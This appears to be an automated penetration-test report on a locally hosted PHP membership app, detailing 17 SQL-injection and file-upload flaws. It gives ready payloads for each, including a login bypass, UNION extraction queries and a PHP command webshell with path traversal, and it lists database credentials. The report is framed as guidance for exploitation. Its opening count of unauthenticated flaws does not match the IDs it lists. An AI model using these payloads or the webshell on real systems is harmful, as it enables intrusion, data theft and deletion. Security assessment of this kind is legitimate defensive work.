# Injection Analysis Report (SQLi & Command Injection)

## 1. Executive Summary

- **Analysis Status:** Complete
- **Key Outcome:** Seventeen (17) high-confidence injection vulnerabilities were identified across 14 distinct source locations — 14 SQL Injection paths and 3 File Upload / Remote Code Execution paths. No command injection, SSTI, or deserialization vulnerabilities were found (confirmed absent). All 14 SQLi findings and 3 file upload findings are externally exploitable via HTTP to `http://host.docker.internal:9010`. Three of the SQLi vulnerabilities (SQLi-01, SQLi-04, SQLi-09, SQLi-11) are accessible without any authentication whatsoever.
- **Purpose of this Document:** This report provides the strategic context, dominant patterns, and environmental intelligence necessary to effectively exploit the vulnerabilities listed in the exploitation queue. It is intended to be read alongside the structured JSON deliverable.

---

## 2. Dominant Vulnerability Patterns

### Pattern A — Raw String Interpolation into `$conn->query()` (No Prepared Statements)
- **Description:** The entire application uses `mysqli` in raw query mode. Every single SQL query is constructed by directly interpolating PHP variables (sourced from `$_GET`, `$_POST`, `$_FILES`) into double-quoted strings, then passed to `$conn->query($sql)`. There is no use of prepared statements (`prepare()`/`bind_param()`), no `mysqli_real_escape_string()`, no `intval()` cast, no whitelist validation — anywhere in the codebase.
- **Implication:** Every input parameter that feeds a SQL query is exploitable. No partial mitigations exist to route around. Time-based, error-based, UNION-based, and boolean-based blind injection are all available depending on context.
- **Representative:** INJ-VULN-01 (login bypass), INJ-VULN-11 (unauthenticated card print)

### Pattern B — Unauthenticated Endpoints with Direct SQLi
- **Description:** Three endpoints (`delete_members.php`, `print_membership_card.php`, `get_membership_amount.php`) have no session guard. They accept GET parameters and immediately interpolate them into SQL queries without any authentication check.
- **Implication:** An external attacker with zero credentials can directly exploit SQL injection on these endpoints to extract the full database (all tables: `users`, `members`, `membership_types`, `renew`, `settings`), including admin password hashes.
- **Representative:** INJ-VULN-04, INJ-VULN-09, INJ-VULN-11

### Pattern C — Numeric Slots Without Type Casting
- **Description:** Integer-typed parameters (`id`, `membershipTypeId`, `edit_id`, `totalAmount`) are interpolated without quotes directly into SQL numeric slots. While this means single-quote-based injection doesn't apply, numeric injection (e.g., `1 UNION SELECT ...`, `1 AND SLEEP(5)`) is fully viable since no `intval()` or `(int)` cast is applied.
- **Implication:** Numeric injection is highly reliable — no quoting context to escape, just append SQL syntax directly.
- **Representative:** INJ-VULN-04, INJ-VULN-09

### Pattern D — Unrestricted File Upload (PHP Webshell RCE)
- **Description:** The `settings.php` logo upload uses the raw client-supplied filename as the destination path under `uploads/`. The `add_members.php` and `edit_member.php` photo uploads preserve the attacker-controlled file extension. The `uploads/` directory is Apache-served with PHP execution enabled (no `.htaccess` restriction). Uploading a `.php` file results in an executable webshell.
- **Implication:** An authenticated attacker (or unauthenticated for the logo upload after auth bypass via SQLi-01) can achieve full Remote Code Execution on the server.
- **Representative:** INJ-VULN-17 (settings logo), INJ-VULN-15 (add member photo), INJ-VULN-16 (edit member photo)

---

## 3. Strategic Intelligence for Exploitation

### Defensive Evasion (WAF Analysis)
- No WAF was detected. The application runs raw Apache/PHP with no mod_security, no reverse proxy, no rate limiting. All payloads should be sent directly.
- **Recommendation:** Use full UNION-based injection for rapid data extraction since there is no filtering at all.

### Error-Based Injection Potential
- The application echoes `$conn->error` directly to the browser in multiple locations (e.g., `delete_members.php` line 52: `echo "Error deleting record: " . $conn->error`; `add_type.php` line 21; `edit_type.php` line 23; `add_members.php` line 54; `settings.php` lines 27/38/67). MySQL error messages are fully visible to the attacker.
- **Recommendation:** Error-based extraction (e.g., `ExtractValue()`, `UpdateXML()` MySQL functions) will return data inside error messages for endpoints that echo `$conn->error`. This enables rapid schema and data extraction without blind techniques.

### Confirmed Database Technology
- Database is **MySQL 8.0**, confirmed from the technology stack (recon). Application connects as `root`/`rootpass`.
- All payloads should use MySQL-specific syntax: `SLEEP()`, `INFORMATION_SCHEMA`, `GROUP_CONCAT()`, `EXTRACTVALUE()`, `-- -` or `#` comment terminators.
- The `root` database user has full privileges — `INTO OUTFILE`, `LOAD DATA INFILE`, and reading system tables are all available.

### Authentication Bypass Priority
- `index.php` login is injectable on `email` field. A classic `' OR '1'='1'-- -` bypass gives immediate admin session, unlocking all 16 authenticated endpoints for further exploitation.
- However, the 3 unauthenticated endpoints (INJ-VULN-04, INJ-VULN-09, INJ-VULN-11) are preferred starting points since they require no credentials at all for full database extraction.

### File Upload RCE Path
- Fastest RCE path: Bypass login via SQLi on `index.php`, then upload `shell.php` via `settings.php` logo upload (verbatim filename, no extension check). The shell lands at `http://host.docker.internal:9010/uploads/shell.php` and is immediately executable.
- Alternatively: Direct `get_membership_amount.php` UNION injection can extract the `users` table hash, crack the MD5 hash (MD5 is trivially reversible), login normally, then upload.

---

## 4. Vectors Analyzed and Confirmed Secure

No input vectors were confirmed secure. The application contains **zero** prepared statements, **zero** calls to `mysqli_real_escape_string()`, **zero** type casts (`intval`, `(int)`), and **zero** input whitelists across all 19 PHP files. Every user-controlled input that reaches a SQL query does so without any defense.

| **Source (Parameter/Key)** | **Endpoint/File Location** | **Defense Mechanism** | **Verdict** |
|---|---|---|---|
| `$_POST['password']` | `index.php` | MD5 hash applied before interpolation — hash output is hex-only so no SQLi in that slot | SAFE (password slot only) |
| `$_SESSION['user_id']` | `settings.php` line 51 | Session-sourced integer used in `WHERE id = $userId` — session is server-side controlled | SAFE (session-internal only) |
| `$_POST['renewDuration']` via `strtotime("+$renewDuration months")` | `renew.php` line 32 | `$expiryDate` produced by `date()` is always a formatted date string, never reaches SQL raw | SAFE (date output only) |

---

## 5. Analysis Constraints and Blind Spots

- **File Upload Execution Confirmed by Architecture:** The `uploads/` directory has no `.htaccess` and Apache serves it with PHP execution. This was confirmed via directory listing in recon; no live test was performed (analysis phase only).
- **`$_POST['extend']` in renew.php:** The `$renewDuration` value from `$_POST['extend']` is passed to `strtotime("+$renewDuration months")` — the result is then formatted via `date()` into `$expiryDate` which is quoted in the SQL. This slot is safe from SQLi. However, the value is **also** used in the `strtotime` call itself — a secondary injection concern (PHP date manipulation) is out of scope.
- **`manage_members.php` and `view_type.php` guard-after-query pattern:** These files execute a SELECT before checking the session guard. The SELECT queries use no user input and are hardcoded — no injection vector here, but PII leaks before auth check is noted.
- **`dashboard.php`:** No user-controlled input flows into any SQL query on this page. Not an injection vector.
- **`list_renewal.php`:** No user-controlled input flows into SQL. Not an injection vector.

---

## 6. Vulnerability Findings

### INJ-VULN-01 — SQLi: Login Bypass via email field (Unauthenticated)
- **File:** `index.php` lines 6, 14–15
- **Source:** `$_POST['email']` → `$email` (line 6)
- **Path:** `index.php POST handler` → raw string concat → `$conn->query($sql)` (line 15)
- **Sink:** `$conn->query("SELECT * FROM users WHERE email = '$email' AND password = '$hashed_password'")` at `index.php:15`
- **Slot Type:** SQL-val (string value in WHERE clause)
- **Sanitization:** None
- **Verdict:** VULNERABLE — No escaping, no binding. Single quote in email breaks out of string literal, enabling full authentication bypass or data extraction from `users` table.
- **Witness Payload:** `' OR '1'='1'-- -` as email, any password
- **Confidence:** High
- **Externally Exploitable:** Yes (unauthenticated, public endpoint)

### INJ-VULN-02 — SQLi: Edit Member GET id → SELECT (Authenticated)
- **File:** `edit_member.php` lines 14–18
- **Source:** `$_GET['id']` → `$memberId` (line 15)
- **Path:** `edit_member.php GET handler` → raw interpolation → `$conn->query($fetchMemberQuery)` (line 18)
- **Sink:** `"SELECT * FROM members WHERE id = $memberId"` at `edit_member.php:17`
- **Slot Type:** SQL-num (unquoted numeric WHERE clause)
- **Sanitization:** None
- **Verdict:** VULNERABLE — No intval(), no binding. Direct numeric injection possible.
- **Witness Payload:** `1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- -`
- **Confidence:** High

### INJ-VULN-03 — SQLi: Edit Member POST fields → UPDATE (Authenticated)
- **File:** `edit_member.php` lines 37–45, 56–59
- **Source:** `$_POST['fullname']`, `$_POST['dob']`, `$_POST['gender']`, `$_POST['contactNumber']`, `$_POST['email']`, `$_POST['address']`, `$_POST['country']`, `$_POST['postcode']`, `$_POST['occupation']`
- **Path:** `edit_member.php POST handler` → raw interpolation → `$conn->query($updateQuery)` (line 61)
- **Sink:** `"UPDATE members SET fullname='$fullname', dob='$dob', ... WHERE id = $memberId"` at `edit_member.php:56–59`
- **Slot Type:** SQL-val (string values in SET clause, multiple fields)
- **Sanitization:** None
- **Verdict:** VULNERABLE — All POST fields directly interpolated. Single quote in any field breaks out of string context.
- **Witness Payload:** `', occupation=(SELECT password FROM users LIMIT 1), fullname='pwned` in `fullname` field
- **Confidence:** High

### INJ-VULN-04 — SQLi: Delete Member GET id (Unauthenticated, CRITICAL)
- **File:** `delete_members.php` lines 32–46
- **Source:** `$_GET['id']` → `$memberId` (line 33) — **NO SESSION GUARD**
- **Path:** `delete_members.php` → raw interpolation → three `$conn->query()` calls (lines 36, 40, 48)
- **Sink 1:** `"SELECT * FROM renew WHERE member_id = $memberId"` at `delete_members.php:35`
- **Sink 2:** `"DELETE FROM renew WHERE member_id = $memberId"` at `delete_members.php:39`
- **Sink 3:** `"DELETE FROM members WHERE id = $memberId"` at `delete_members.php:46`
- **Slot Type:** SQL-num
- **Sanitization:** None
- **Verdict:** VULNERABLE — Unauthenticated numeric injection into three queries. Boolean/time-based blind SQLi for data extraction; also allows destructive DELETE of all records if `id=1 OR 1=1`.
- **Witness Payload:** `1 AND SLEEP(5)` (time-based blind on SELECT query)
- **Confidence:** High
- **Externally Exploitable:** Yes (no auth required)

### INJ-VULN-05 — SQLi: Delete Membership Type GET id (Authenticated)
- **File:** `delete_membership.php` lines 9–12
- **Source:** `$_GET['id']` → `$delete_id` (line 10)
- **Path:** `delete_membership.php` → raw interpolation → `$conn->query($deleteQuery)` (line 14)
- **Sink:** `"DELETE FROM membership_types WHERE id = $delete_id"` at `delete_membership.php:12`
- **Slot Type:** SQL-num
- **Sanitization:** None (`?? null` on line 10 only handles missing param, not injection)
- **Verdict:** VULNERABLE — No intval(). Numeric injection into DELETE query.
- **Witness Payload:** `1 AND SLEEP(5)` or `0 UNION SELECT 1-- -` (for error-based)
- **Confidence:** High

### INJ-VULN-06 — SQLi: Edit Type GET id → SELECT (Authenticated)
- **File:** `edit_type.php` lines 27–29
- **Source:** `$_GET['id']` → `$edit_id` (line 27)
- **Path:** `edit_type.php` → raw interpolation → `$conn->query($editQuery)` (line 29)
- **Sink:** `"SELECT * FROM membership_types WHERE id = $edit_id"` at `edit_type.php:28`
- **Slot Type:** SQL-num
- **Sanitization:** None
- **Verdict:** VULNERABLE
- **Witness Payload:** `1 UNION SELECT 1,2,3-- -`
- **Confidence:** High

### INJ-VULN-07 — SQLi: Edit Type POST fields → UPDATE (Authenticated)
- **File:** `edit_type.php` lines 11–17
- **Source:** `$_POST['membershipType']` → `$membershipType` (line 12); `$_POST['membershipAmount']` → `$membershipAmount` (line 13); `$_POST['edit_id']` → `$id` (line 15)
- **Path:** `edit_type.php POST handler` → raw interpolation → `$conn->query($updateQuery)` (line 19)
- **Sink:** `"UPDATE membership_types SET type = '$membershipType', amount = $membershipAmount WHERE id = $id"` at `edit_type.php:17`
- **Slot Type:** SQL-val (membershipType), SQL-num (membershipAmount, id)
- **Sanitization:** None
- **Verdict:** VULNERABLE — `membershipType` injectable via single quote; `membershipAmount` and `edit_id` injectable as numeric slots.
- **Witness Payload:** `' WHERE 1=1-- -` in membershipType
- **Confidence:** High

### INJ-VULN-08 — SQLi: Add Membership Type POST → INSERT (Authenticated)
- **File:** `add_type.php` lines 11–15
- **Source:** `$_POST['membershipType']` → `$membershipType` (line 12); `$_POST['membershipAmount']` → `$membershipAmount` (line 13)
- **Path:** `add_type.php POST handler` → raw interpolation → `$conn->query($insertQuery)` (line 17)
- **Sink:** `"INSERT INTO membership_types (type, amount) VALUES ('$membershipType', $membershipAmount)"` at `add_type.php:15`
- **Slot Type:** SQL-val (membershipType), SQL-num (membershipAmount)
- **Sanitization:** None
- **Verdict:** VULNERABLE — `membershipType` injectable via single quote; `membershipAmount` injectable as unquoted numeric.
- **Witness Payload:** `test'), (0x61646d696e,(SELECT password FROM users LIMIT 1))-- -` in membershipType (stacked INSERT)
- **Confidence:** High

### INJ-VULN-09 — SQLi: Get Membership Amount GET id (Unauthenticated, CRITICAL)
- **File:** `get_membership_amount.php` lines 9–15
- **Source:** `$_GET['membershipTypeId']` → `$membershipTypeId` (line 10) — **NO SESSION GUARD**
- **Path:** `get_membership_amount.php` → raw interpolation → `$conn->query($membershipTypeQuery)` (line 15)
- **Sink:** `"SELECT amount FROM membership_types WHERE id = $membershipTypeId"` at `get_membership_amount.php:14`
- **Slot Type:** SQL-num
- **Sanitization:** None
- **Verdict:** VULNERABLE — Unauthenticated numeric injection. JSON response (`success`, `amount`) provides an out-of-band data channel via UNION SELECT. Error message also echoed in JSON `message` field.
- **Witness Payload:** `0 UNION SELECT password FROM users LIMIT 1-- -`
- **Confidence:** High
- **Externally Exploitable:** Yes (no auth required)

### INJ-VULN-10 — SQLi: Member Profile GET id (Authenticated)
- **File:** `memberProfile.php` lines 9–16
- **Source:** `$_GET['id']` → `$memberId` (line 10)
- **Path:** `memberProfile.php` → raw interpolation → `$conn->query($selectQuery)` (line 16)
- **Sink:** `"SELECT members.*, membership_types.type ... WHERE members.id = $memberId"` at `memberProfile.php:12–15`
- **Slot Type:** SQL-num
- **Sanitization:** None
- **Verdict:** VULNERABLE — Numeric injection into JOIN SELECT.
- **Witness Payload:** `1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- -`
- **Confidence:** High

### INJ-VULN-11 — SQLi: Print Membership Card GET id (Unauthenticated, CRITICAL)
- **File:** `print_membership_card.php` lines 4–9
- **Source:** `$_GET['id']` → `$memberId` (line 4) — **NO SESSION GUARD, NO isset() CHECK**
- **Path:** `print_membership_card.php` → raw interpolation → `$conn->query($selectQuery)` (line 9)
- **Sink:** `"SELECT members.*, membership_types.type ... WHERE members.id = $memberId"` at `print_membership_card.php:5–8`
- **Slot Type:** SQL-num
- **Sanitization:** None — note: no `isset()` check means undefined `$_GET['id']` causes PHP notice but code still executes
- **Verdict:** VULNERABLE — Unauthenticated numeric injection into JOIN SELECT. Full HTML page output includes member PII and membership data, providing a rich data exfiltration channel.
- **Witness Payload:** `0 UNION SELECT 1,password,3,4,5,6,7,8,9,10,11,12,13,14 FROM users-- -`
- **Confidence:** High
- **Externally Exploitable:** Yes (no auth required)

### INJ-VULN-12 — SQLi: Add Member POST fields → INSERT (Authenticated)
- **File:** `add_members.php` lines 22–48
- **Source:** `$_POST['fullname']`, `$_POST['dob']`, `$_POST['gender']`, `$_POST['contactNumber']`, `$_POST['email']`, `$_POST['address']`, `$_POST['country']`, `$_POST['postcode']`, `$_POST['occupation']`, `$_POST['membershipType']`
- **Path:** `add_members.php POST handler` → raw interpolation → `$conn->query($insertQuery)` (line 50)
- **Sink:** `"INSERT INTO members (...) VALUES ('$fullname', '$dob', '$gender', ..., '$membershipType', ...)"` at `add_members.php:45–48`
- **Slot Type:** SQL-val (all quoted string fields), SQL-num (membershipType is unquoted)
- **Sanitization:** None
- **Verdict:** VULNERABLE — All POST string fields injectable via single quote. `membershipType` injectable as numeric slot.
- **Witness Payload:** `'), (0x41414141,NOW(),'M','0000','test@test.com','addr','US','XX','A+',1,'CA-999999','pwned.jpg',NOW())-- -` in fullname
- **Confidence:** High

### INJ-VULN-13 — SQLi: Renew Member GET id + POST fields (Authenticated)
- **File:** `renew.php` lines 14–40
- **Sources:** `$_GET['id']` → `$memberId` (line 15); `$_POST['membershipType']` → `$membershipTypeId` (line 29); `$_POST['totalAmount']` → `$totalAmount` (line 37)
- **Path:** `renew.php GET+POST handler` → raw interpolation → multiple `$conn->query()` calls
- **Sink 1:** `"SELECT * FROM members WHERE id = $memberId"` at `renew.php:17`
- **Sink 2:** `"UPDATE members SET membership_type = $membershipTypeId, expiry_date = '$expiryDate' WHERE id = $memberId"` at `renew.php:34`
- **Sink 3:** `"INSERT INTO renew (member_id, total_amount, renew_date) VALUES ($memberId, $totalAmount, '$renewDate')"` at `renew.php:39`
- **Slot Type:** SQL-num (all three variables unquoted)
- **Sanitization:** None
- **Verdict:** VULNERABLE — Three distinct injection points, all numeric-unquoted. `totalAmount` is client-controlled (readonly HTML field but no server-side enforcement), enabling financial data manipulation.
- **Witness Payload:** `1 AND SLEEP(5)` in GET id; `0 UNION SELECT 1-- -` in membershipType
- **Confidence:** High

### INJ-VULN-14 — SQLi: Date-Range Report POST (Authenticated, 2 endpoints)
- **Files:** `report.php` lines 9–17; `revenue_report.php` lines 9–18
- **Sources:** `$_POST['fromDate']` → `$fromDate`; `$_POST['toDate']` → `$toDate`
- **Path:** POST handler → raw interpolation → `$conn->query($reportQuery)`
- **Sink (report.php):** `"SELECT ... WHERE m.created_at BETWEEN '$fromDate' AND '$toDate'"` at `report.php:16`
- **Sink (revenue_report.php):** `"SELECT ... WHERE r.renew_date BETWEEN '$fromDate' AND '$toDate'"` at `revenue_report.php:17`
- **Slot Type:** SQL-val (date strings in BETWEEN clause)
- **Sanitization:** None
- **Verdict:** VULNERABLE — Both date fields injectable via single quote breaking out of BETWEEN string context.
- **Witness Payload:** `2020-01-01' AND SLEEP(5)-- -` in fromDate; `' UNION SELECT 1,2,3,4,5-- -` in toDate
- **Confidence:** High

### INJ-VULN-15 — File Upload RCE: Member Photo (add_members.php) (Authenticated)
- **File:** `add_members.php` lines 36–43
- **Source:** `$_FILES['photo']['name']` → `pathinfo($originalName, PATHINFO_EXTENSION)` preserves attacker extension → `$uniqueName = $timestamp . '_' . uniqid() . '.' . $extension` → `move_uploaded_file($uploadedPhoto['tmp_name'], 'uploads/member_photos/' . $uniquePhotoName)`
- **Path:** File upload handler → extension extraction only → `move_uploaded_file()` to `uploads/member_photos/`
- **Sink:** `move_uploaded_file()` at `add_members.php:40`
- **Slot Type:** FILE-path
- **Sanitization:** `pathinfo(PATHINFO_EXTENSION)` extracts extension but does NOT validate it against a whitelist
- **Verdict:** VULNERABLE — Attacker uploads `shell.php`; extension `.php` is preserved; file is stored as `<timestamp>_<uniqid>.php` in `uploads/member_photos/` which is Apache-served with PHP execution. File is immediately executable at `http://host.docker.internal:9010/uploads/member_photos/<name>.php`.
- **Witness Payload:** Upload file named `shell.php` with content `<?php system($_GET['cmd']); ?>`
- **Confidence:** High

### INJ-VULN-16 — File Upload RCE: Member Photo (edit_member.php) (Authenticated)
- **File:** `edit_member.php` lines 28–53
- **Source:** `$_FILES['photo']['name']` → `generateUniqueFileName($uploadedPhoto['name'])` (line 51) → preserves original basename + extension → `move_uploaded_file($uploadedPhoto['tmp_name'], 'uploads/member_photos/' . $uniquePhotoName)` (line 52)
- **Path:** File upload handler → `generateUniqueFileName()` (lines 28–34) → `move_uploaded_file()` to `uploads/member_photos/`
- **Sink:** `move_uploaded_file()` at `edit_member.php:52`
- **Slot Type:** FILE-path
- **Sanitization:** `generateUniqueFileName()` at lines 28–34 uses `pathinfo(PATHINFO_EXTENSION)` and `pathinfo(PATHINFO_FILENAME)` — extracts components but performs NO extension whitelist check
- **Verdict:** VULNERABLE — Attacker uploads `shell.php`; filename stored as `shell_<time>.php` in `uploads/member_photos/`. PHP execution enabled.
- **Witness Payload:** Upload file named `shell.php` with content `<?php system($_GET['cmd']); ?>`
- **Confidence:** High

### INJ-VULN-17 — File Upload RCE: Logo Upload (settings.php) — CRITICAL (Authenticated)
- **File:** `settings.php` lines 13–22
- **Source:** `$_FILES['logo']['name']` → `$logoName` (line 14) → `$targetPath = 'uploads/' . $logoName` (line 19) → `move_uploaded_file($logoTmpName, $targetPath)` (line 20)
- **Path:** File upload handler → raw filename concat → `move_uploaded_file()`
- **Sink:** `move_uploaded_file($logoTmpName, $targetPath)` at `settings.php:20`
- **Slot Type:** FILE-path
- **Sanitization:** NONE — the raw client-supplied filename is used verbatim as the destination path. No extension check, no filename sanitization, no path traversal check.
- **Verdict:** VULNERABLE (CRITICAL) — Full control of destination path including:
  1. Upload `shell.php` → stored at `uploads/shell.php` → immediately executable
  2. Upload `../shell.php` → path traversal to document root → executable at `http://host.docker.internal:9010/shell.php`
  3. The `$targetPath` is also stored in the `settings` table SQL query (line 21) — second-order injection if the logo path is read back into queries.
- **Witness Payload (file upload):** File named `shell.php` with `<?php system($_GET['cmd']); ?>` → executes at `/uploads/shell.php`
- **Witness Payload (path traversal):** File named `../shell.php` → executes at `/shell.php` (docroot)
- **Confidence:** High

---
